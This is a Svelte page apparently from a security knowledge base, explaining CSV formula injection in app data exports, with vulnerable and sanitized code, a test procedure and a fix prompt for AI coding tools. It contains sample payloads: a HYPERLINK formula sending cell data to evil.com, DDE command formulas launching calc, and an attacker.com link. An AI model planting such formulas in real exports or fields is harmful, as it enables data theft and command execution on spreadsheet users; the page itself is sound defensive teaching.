<script lang="ts">
	import { Header } from '$lib/components/layout';

	const meta = {
		title: 'CSV Injection: Detect & Fix Guide',
		description: 'CSV injection lets attackers embed formulas in exports that execute when opened in Excel. Learn to detect and sanitize user data in CSV exports.',
		url: '/kb/security/vulnerabilities/csv-injection/'
	};

	const breadcrumbs = [
		{ label: 'Knowledge Base', href: '/kb' },
		{ label: 'Security', href: '/kb/security' },
		{ label: 'Vulnerabilities', href: '/kb/security/vulnerabilities' },
		{ label: 'CSV Injection' }
	];

	const securityData = {
		cweId: 'CWE-1236',
		cweName: 'Improper Neutralization of Formula Elements in a CSV File',
		cweSource: 'https://cwe.mitre.org/data/definitions/1236.html',
		owaspCategory: 'A03:2021 - Injection',
		owaspSource: 'https://owasp.org/Top10/A03_2021-Injection/',
		severity: 'Medium-High',
		cvssScore: '6.0-7.5'
	};

	const dangerousChars = ['=', '+', '-', '@', '\\t', '\\r', '\\n'];

	const faqs = [
		{
			question: 'What is CSV injection?',
			answer: 'CSV injection (also called formula injection) occurs when user-controlled data written to CSV files contains spreadsheet formula syntax. When opened in Excel or Google Sheets, these "formulas" execute. An attacker can exfiltrate data, trigger external requests, or in some cases achieve code execution via DDE.'
		},
		{
			question: 'How do I prevent formula injection in exports?',
			answer: 'Prefix dangerous characters with a single quote or tab character. If a cell value starts with =, +, -, or @, prepend it with a quote: \'=cmd. The quote is invisible in Excel but prevents formula execution. Alternatively, wrap all values in quotes and escape internal quotes.'
		},
		{
			question: 'What characters trigger formula injection?',
			answer: 'The main dangerous prefixes are: = (formula), + (formula), - (negative/formula), @ (Excel function). Tab and carriage return can also trigger issues. Any cell starting with these characters may be interpreted as a formula by spreadsheet applications.'
		},
		{
			question: 'Can CSV injection lead to RCE?',
			answer: 'Yes, via DDE (Dynamic Data Exchange) on Windows. A formula like =cmd|/C calc.exe can execute commands if the user clicks through Excel\'s security warnings. Modern Excel versions show warnings, but users often click through them. DDE attacks are less common but still dangerous.'
		},
		{
			question: 'How do I safely export user data to CSV?',
			answer: 'Sanitize all user-controlled values before writing to CSV. Prefix dangerous characters with a quote. Use a CSV library that handles escaping properly. Consider offering JSON export as an alternative—JSON doesn\'t execute in spreadsheets. Always test exports with real user data patterns.'
		}
	];

	let copied = $state(false);

	function copyPrompt() {
		const prompt = document.getElementById('ai-fix-prompt')?.textContent || '';
		navigator.clipboard.writeText(prompt);
		copied = true;
		setTimeout(() => copied = false, 2000);
	}
</script>

<svelte:head>
	<title>{meta.title}</title>
	<meta name="description" content={meta.description} />
	<meta property="og:title" content={meta.title} />
	<meta property="og:description" content={meta.description} />
	<meta property="og:url" content={meta.url} />
	<meta property="og:type" content="article" />
	<link rel="canonical" href="https://vibeship.co{meta.url}" />

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "BreadcrumbList",
		"itemListElement": [
			{"@type": "ListItem", "position": 1, "name": "Knowledge Base", "item": "https://vibeship.co/kb"},
			{"@type": "ListItem", "position": 2, "name": "Security", "item": "https://vibeship.co/kb/security"},
			{"@type": "ListItem", "position": 3, "name": "Vulnerabilities", "item": "https://vibeship.co/kb/security/vulnerabilities"},
			{"@type": "ListItem", "position": 4, "name": "CSV Injection"}
		]
	}
	</script>`}

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "TechArticle",
		"headline": "${meta.title}",
		"description": "${meta.description}",
		"author": {"@type": "Organization", "name": "VibeShip"},
		"publisher": {"@type": "Organization", "name": "VibeShip"},
		"datePublished": "2024-12-26",
		"dateModified": "2024-12-26"
	}
	</script>`}

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "FAQPage",
		"mainEntity": ${JSON.stringify(faqs.map(faq => ({
			"@type": "Question",
			"name": faq.question,
			"acceptedAnswer": {"@type": "Answer", "text": faq.answer}
		})))}
	}
	</script>`}
</svelte:head>

<Header {breadcrumbs} />

<div class="content-wrapper">
	<article class="content-main content-wide">
		<header class="article-header">
			<div class="badge-row">
				<span class="badge badge-medium">Medium-High</span>
				<span class="badge">{securityData.cweId}</span>
				<span class="badge">OWASP A03</span>
			</div>
			<h1>CSV Injection in Vibe Coded Apps</h1>
			<p class="text-secondary">When your data exports become executable code</p>
		</header>

		<!-- Quick Answer -->
		<div class="quick-answer">
			<div class="quick-answer-label">Quick Answer</div>
			<p class="quick-answer-text">
				<strong>CSV injection embeds formulas in exports that execute when opened in Excel.</strong>
				If user data starts with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, spreadsheets treat it as a formula. Attackers can exfiltrate data or trigger code execution. Fix: prefix dangerous characters with a single quote (<code>'=data</code>) before writing to CSV.
			</p>
		</div>

		<!-- Stats Box -->
		<div class="stats-row">
			<div class="stat-box">
				<div class="stat-value">=</div>
				<div class="stat-label">Formula prefix</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">DDE</div>
				<div class="stat-label">Can achieve RCE</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">Export</div>
				<div class="stat-label">Common in dashboards</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">'</div>
				<div class="stat-label">Single quote escapes</div>
			</div>
		</div>

		<!-- What Is It - @keystrokecounts voice (optimizer, efficient) -->
		<section class="article-section">
			<h2>What is CSV injection?</h2>
			<p>
				CSV injection is embedding executable code in what looks like plain data. When a user exports data to CSV and opens it in Excel or Google Sheets, any cell starting with a formula character gets executed.
			</p>

			<div class="dangerous-chars">
				<h3>Dangerous prefixes</h3>
				<div class="char-grid">
					<div class="char-item">
						<code>=</code>
						<span>Formula</span>
					</div>
					<div class="char-item">
						<code>+</code>
						<span>Formula</span>
					</div>
					<div class="char-item">
						<code>-</code>
						<span>Formula/Negative</span>
					</div>
					<div class="char-item">
						<code>@</code>
						<span>Excel function</span>
					</div>
					<div class="char-item">
						<code>\t</code>
						<span>Tab (triggers)</span>
					</div>
					<div class="char-item">
						<code>\r</code>
						<span>Carriage return</span>
					</div>
				</div>
			</div>

			<div class="attack-example">
				<h3>Attack example</h3>
				<div class="example-flow">
					<div class="example-step">
						<div class="step-label">Attacker inputs</div>
						<code>=HYPERLINK("http://evil.com/steal?d="&A1,"Click")</code>
					</div>
					<div class="example-step">
						<div class="step-label">App exports to CSV</div>
						<code>Name,Email\n=HYPERLINK(...),user@example.com</code>
					</div>
					<div class="example-step">
						<div class="step-label">Victim opens in Excel</div>
						<span>Formula executes, data exfiltrated</span>
					</div>
				</div>
			</div>
		</section>

		<!-- Why Vibe Coded Apps -->
		<section class="article-section">
			<h2>Why vibe coded apps are vulnerable</h2>
			<p>
				Every dashboard has an "Export to CSV" button. AI generates the export but treats data as just data—it doesn't know spreadsheets execute formulas.
			</p>

			<div class="code-comparison">
				<div class="code-block code-bad">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable - Direct data export</span>
						<span class="code-label-bad">No sanitization</span>
					</div>
					<pre><code>{`// AI generates this simple export
app.get('/export/users', async (req, res) => {
  const users = await db.users.findAll();

  let csv = 'Name,Email,Notes\\n';
  users.forEach(user => {
    // User-controlled data written directly!
    csv += \`\${user.name},\${user.email},\${user.notes}\\n\`;
  });

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=users.csv');
  res.send(csv);
});

// If user.notes = "=cmd|'/C calc'!A0"
// Excel executes it as a command (DDE)`}</code></pre>
				</div>
				<div class="code-block code-good">
					<div class="code-block-header">
						<span class="code-block-lang">Secure - Sanitized export</span>
						<span class="code-label-good">Fixed</span>
					</div>
					<pre><code>{`// Sanitize values before CSV export
function sanitizeForCsv(value: string): string {
  if (typeof value !== 'string') return String(value);

  // Escape quotes by doubling them
  let escaped = value.replace(/"/g, '""');

  // Prefix formula characters with single quote
  const dangerousPrefixes = /^[=+\\-@\\t\\r]/;
  if (dangerousPrefixes.test(escaped)) {
    escaped = "'" + escaped;
  }

  // Wrap in quotes if contains comma, newline, or quote
  if (/[",\\n\\r]/.test(escaped)) {
    escaped = \`"\${escaped}"\`;
  }

  return escaped;
}

app.get('/export/users', async (req, res) => {
  const users = await db.users.findAll();

  let csv = 'Name,Email,Notes\\n';
  users.forEach(user => {
    csv += [
      sanitizeForCsv(user.name),
      sanitizeForCsv(user.email),
      sanitizeForCsv(user.notes)
    ].join(',') + '\\n';
  });

  res.setHeader('Content-Type', 'text/csv');
  res.send(csv);
});`}</code></pre>
				</div>
			</div>
		</section>

		<!-- Detection -->
		<section class="article-section">
			<h2>How to detect CSV injection</h2>
			<p>
				Test exports with formula-prefixed data.
			</p>

			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Testing for CSV Injection</span>
				</div>
				<pre><code>{`# Step 1: Create test data with formula prefixes
# In any user-controlled field, enter:
=1+1
+1+1
-1+1
@SUM(1+1)
=HYPERLINK("http://attacker.com","Click")
=cmd|'/C calc'!A0

# Step 2: Export to CSV
# Download the CSV file

# Step 3: Open in Excel/Sheets
# Check if formulas execute or show warnings

# Step 4: Inspect raw CSV
cat export.csv | grep -E "^[=+\\-@]"
# If dangerous prefixes appear unsanitized: VULNERABLE

# Step 5: Test with tab prefix
# Input: [TAB]=1+1
# Some apps miss tab-prefixed formulas`}</code></pre>
			</div>

			<div class="check-list">
				<h3>CSV export audit checklist</h3>
				<ul>
					<li>Are formula prefixes (=, +, -, @) escaped?</li>
					<li>Are values wrapped in quotes properly?</li>
					<li>Are internal quotes escaped (doubled)?</li>
					<li>Is tab/carriage return handled?</li>
					<li>Is there a JSON export alternative?</li>
				</ul>
			</div>

			<div class="cta-box">
				<p><strong>Export features often hide injection flaws.</strong></p>
				<a href="https://scanner.vibeship.co" class="btn btn-green">
					Scan your exports
					<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
						<path d="M5 12h14M12 5l7 7-7 7"/>
					</svg>
				</a>
			</div>
		</section>

		<!-- How to Fix -->
		<section class="article-section">
			<h2>How to fix CSV injection</h2>
			<p>
				Sanitize every user-controlled value before writing to CSV.
			</p>

			<div class="fix-section">
				<h3>AI Fix Prompt</h3>
				<p>Copy this into your AI coding tool to find and fix CSV injection vulnerabilities:</p>

				<div class="fix-prompt">
					<div class="fix-prompt-header">
						<span class="fix-prompt-label">Copy-paste this prompt</span>
						<button class="copy-btn" class:copied onclick={copyPrompt}>
							{copied ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<div class="fix-prompt-content" id="ai-fix-prompt">{`Audit my codebase for CSV injection vulnerabilities.

## What to search for

1. CSV export endpoints:
   \`\`\`
   /export
   /download
   .csv
   text/csv
   Content-Disposition.*csv
   \`\`\`

2. CSV generation code:
   \`\`\`
   .join(',')
   csv +=
   writeFile.*csv
   createObjectCsvWriter
   papa.unparse
   \`\`\`

3. User data going into exports:
   \`\`\`
   user.name
   user.notes
   record.description
   \`\`\`
   Any field users can control.

## Required fixes

### Fix 1: Create sanitization function
\`\`\`typescript
// utils/csvSanitizer.ts
const FORMULA_PREFIXES = /^[=+\\-@\\t\\r\\n]/;

export function sanitizeCsvValue(value: unknown): string {
  if (value === null || value === undefined) return '';

  let str = String(value);

  // Escape internal quotes by doubling
  str = str.replace(/"/g, '""');

  // Prefix formula characters with single quote
  // The quote is invisible in Excel but prevents execution
  if (FORMULA_PREFIXES.test(str)) {
    str = "'" + str;
  }

  // Wrap in quotes if contains special characters
  if (/[",\\n\\r]/.test(str) || str.includes(',')) {
    str = \`"\${str}"\`;
  }

  return str;
}

export function sanitizeCsvRow(values: unknown[]): string {
  return values.map(sanitizeCsvValue).join(',');
}
\`\`\`

### Fix 2: Apply to all exports
\`\`\`typescript
import { sanitizeCsvValue, sanitizeCsvRow } from './utils/csvSanitizer';

app.get('/export/data', async (req, res) => {
  const records = await db.records.findAll();

  const headers = ['Name', 'Email', 'Notes', 'Created'];
  let csv = headers.join(',') + '\\n';

  records.forEach(record => {
    csv += sanitizeCsvRow([
      record.name,
      record.email,
      record.notes,
      record.createdAt
    ]) + '\\n';
  });

  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="export.csv"');
  res.send(csv);
});
\`\`\`

### Fix 3: Use a CSV library with built-in safety
\`\`\`typescript
import { stringify } from 'csv-stringify/sync';

// Configure with safety options
const csv = stringify(records, {
  header: true,
  columns: ['name', 'email', 'notes'],
  cast: {
    string: (value) => {
      // Still sanitize formula prefixes
      if (/^[=+\\-@]/.test(value)) {
        return "'" + value;
      }
      return value;
    }
  }
});
\`\`\`

### Fix 4: Offer JSON as alternative
\`\`\`typescript
// JSON doesn't execute in spreadsheets
app.get('/export/data', async (req, res) => {
  const format = req.query.format || 'json';
  const records = await db.records.findAll();

  if (format === 'csv') {
    // Sanitized CSV export
    res.setHeader('Content-Type', 'text/csv');
    res.send(generateSanitizedCsv(records));
  } else {
    // Safe JSON export
    res.json(records);
  }
});
\`\`\`

## Testing after fix

1. Create records with formula prefixes: =1+1, +cmd, -@SUM
2. Export to CSV
3. Open in Excel—formulas should NOT execute
4. Raw CSV should show: '=1+1 (quoted prefix)
5. Test with tab-prefixed values too`}</div>
				</div>
			</div>

			<div class="fix-section">
				<h3>Sanitization strategies</h3>
				<div class="strategy-cards">
					<div class="strategy-card">
						<h4>Quote prefix</h4>
						<code>=data → '=data</code>
						<p>Single quote prevents execution but is invisible to users.</p>
					</div>
					<div class="strategy-card">
						<h4>Tab prefix</h4>
						<code>=data → \t=data</code>
						<p>Tab character also prevents execution in most apps.</p>
					</div>
					<div class="strategy-card">
						<h4>Double quotes wrap</h4>
						<code>=data → "=data"</code>
						<p>Wrapping in quotes treats content as literal string.</p>
					</div>
				</div>
			</div>
		</section>

		<!-- FAQ -->
		<section class="article-section">
			<h2>Frequently asked questions</h2>
			<div class="faq-list">
				{#each faqs as faq}
					<div class="faq-item">
						<h3>{faq.question}</h3>
						<p>{faq.answer}</p>
					</div>
				{/each}
			</div>
		</section>

		<!-- Related -->
		<section class="article-section">
			<h2>Related content</h2>
			<div class="related-grid">
				<a href="/kb/security/vulnerabilities/xss/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">XSS</div>
					<p class="related-card-description">Output encoding for different contexts</p>
				</a>
				<a href="/kb/security/vulnerabilities/command-injection/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Command Injection</div>
					<p class="related-card-description">Executing unintended commands</p>
				</a>
				<a href="/kb/security/vulnerabilities/ssti/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">SSTI</div>
					<p class="related-card-description">Template injection attacks</p>
				</a>
			</div>
		</section>

		<!-- Final CTA -->
		<div class="final-cta">
			<h2>Your exports shouldn't be attack vectors</h2>
			<p>Sanitize user data before writing to CSV.</p>
			<a href="https://scanner.vibeship.co" class="btn btn-green btn-lg">
				Scan for injection flaws
				<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
					<path d="M5 12h14M12 5l7 7-7 7"/>
				</svg>
			</a>
		</div>
	</article>
</div>

<style>
	.badge-row {
		display: flex;
		gap: 0.5rem;
		margin-bottom: 1rem;
		flex-wrap: wrap;
	}

	/* Dangerous Characters Grid */
	.dangerous-chars {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1.5rem;
		margin: 1.5rem 0;
	}

	.dangerous-chars h3 {
		margin: 0 0 1rem;
		font-size: 1rem;
	}

	.char-grid {
		display: grid;
		grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
		gap: 0.75rem;
	}

	.char-item {
		display: flex;
		flex-direction: column;
		align-items: center;
		gap: 0.25rem;
		padding: 0.75rem;
		background: var(--bg-tertiary);
	}

	.char-item code {
		font-size: 1.25rem;
		color: var(--red);
	}

	.char-item span {
		font-size: 0.75rem;
		color: var(--text-tertiary);
	}

	/* Attack Example */
	.attack-example {
		margin: 1.5rem 0;
	}

	.attack-example h3 {
		margin-bottom: 1rem;
		font-size: 1rem;
	}

	.example-flow {
		display: flex;
		flex-direction: column;
		gap: 0.75rem;
	}

	.example-step {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1rem;
	}

	.step-label {
		font-size: 0.75rem;
		color: var(--text-tertiary);
		text-transform: uppercase;
		margin-bottom: 0.5rem;
	}

	.example-step code {
		font-size: 0.8125rem;
		word-break: break-all;
	}

	/* Code Comparison */
	.code-comparison {
		display: flex;
		flex-direction: column;
		gap: 1rem;
		margin: 1.5rem 0;
	}

	.code-bad {
		border-left: 3px solid var(--red);
	}

	.code-good {
		border-left: 3px solid var(--green);
	}

	.code-label-bad,
	.code-label-good {
		font-size: 0.6875rem;
		padding: 0.125rem 0.5rem;
		text-transform: uppercase;
		font-weight: 600;
	}

	.code-label-bad {
		color: var(--red);
		background: rgba(255, 107, 107, 0.1);
	}

	.code-label-good {
		color: var(--green);
		background: rgba(0, 255, 136, 0.1);
	}

	/* Check List */
	.check-list {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1.5rem;
		margin: 1.5rem 0;
	}

	.check-list h3 {
		margin: 0 0 1rem;
		font-size: 1rem;
	}

	.check-list ul {
		list-style: none;
		padding: 0;
		margin: 0;
	}

	.check-list li {
		padding: 0.5rem 0;
		border-bottom: 1px solid var(--border);
		font-size: 0.9375rem;
		color: var(--text-secondary);
	}

	.check-list li:last-child {
		border-bottom: none;
	}

	/* CTA Box */
	.cta-box {
		background: var(--bg-secondary);
		border: 1px solid var(--green-dim);
		padding: 1.5rem;
		text-align: center;
		margin: 2rem 0;
	}

	.cta-box p {
		margin: 0 0 1rem;
		color: var(--text-primary);
	}

	/* Fix Sections */
	.fix-section {
		margin: 2rem 0;
	}

	.fix-section h3 {
		margin-bottom: 0.75rem;
	}

	/* Strategy Cards */
	.strategy-cards {
		display: grid;
		gap: 1rem;
		margin-top: 1rem;
	}

	.strategy-card {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1rem 1.25rem;
	}

	.strategy-card h4 {
		margin: 0 0 0.5rem;
		font-size: 0.9375rem;
	}

	.strategy-card code {
		display: block;
		background: var(--bg-tertiary);
		padding: 0.5rem;
		margin-bottom: 0.5rem;
		font-size: 0.875rem;
	}

	.strategy-card p {
		margin: 0;
		font-size: 0.875rem;
		color: var(--text-secondary);
	}

	/* FAQ */
	.faq-list {
		margin-top: 1rem;
	}

	.faq-item {
		padding: 1.5rem 0;
		border-bottom: 1px solid var(--border);
	}

	.faq-item:last-child {
		border-bottom: none;
	}

	.faq-item h3 {
		font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
		font-size: 1.0625rem;
		font-weight: 600;
		margin: 0 0 0.5rem;
		color: var(--text-primary);
	}

	.faq-item p {
		margin: 0;
		font-size: 0.9375rem;
		line-height: 1.7;
		color: var(--text-secondary);
	}

	/* Final CTA */
	.final-cta {
		text-align: center;
		padding: 3rem 2rem;
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		margin-top: 3rem;
	}

	.final-cta h2 {
		margin-bottom: 0.75rem;
	}

	.final-cta p {
		color: var(--text-secondary);
		margin-bottom: 1.5rem;
	}

	@media (max-width: 768px) {
		.char-grid {
			grid-template-columns: repeat(3, 1fr);
		}

		.faq-item h3 {
			font-size: 1rem;
		}
	}
</style>
